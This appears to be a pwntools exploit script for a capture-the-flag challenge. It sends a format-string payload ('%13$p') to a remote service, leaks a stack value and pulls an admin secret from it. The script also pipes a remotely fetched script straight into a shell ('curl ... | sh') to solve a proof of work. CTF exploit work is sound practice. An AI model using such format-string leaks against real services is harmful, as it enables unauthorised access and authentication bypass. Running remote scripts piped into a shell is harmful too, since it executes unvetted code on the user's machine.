import re
import subprocess

from pwn import *

HOST = "ctf.csd.lol"
PORT = 7777
OFFSET = 13

context.log_level = "info"


def solve_pow(challenge):
    """
    Jalankan PoW helper dari pwn.red
    """
    cmd = f"curl -sSfL https://pwn.red/pow | sh -s {challenge}"
    log.info("Solving PoW...")
    out = subprocess.check_output(cmd, shell=True)
    return out.strip()


def main():
    io = remote(HOST, PORT)

    # === PoW ===
    io.recvuntil(b"proof of work:\n")
    pow_cmd = io.recvline().decode().strip()
    challenge = pow_cmd.split()[-1]

    solution = solve_pow(challenge)
    io.sendline(solution)

    # === write %13$p ===
    io.recvuntil(b"cmd: ")
    io.sendline(b"write")

    # io.recvuntil(b"data:\n")
    io.sendlineafter(b"data: ", f"%{OFFSET}$p".encode())

    io.recvuntil(b"cmd: ")
    io.sendline(b"read")

    leak = io.recv().split(b"\n")[1]
    log.success(f"Leak: {leak}")

    # === parse leak ===
    leak_val = int(leak, 16)
    secret = (leak_val >> 32) & 0xFFFFFFFF
    log.success(f"Admin secret (upper32): {secret}")

    # === admin ===
    # io.recvuntil(b"cmd: ")
    # io.sendline(b"admin")

    # io.recvuntil(b"auth: ")
    # io.sendline(str(secret).encode())

    # # === flag ===
    # print(io.recvall().decode())
    io.interactive()


if __name__ == "__main__":
    main()
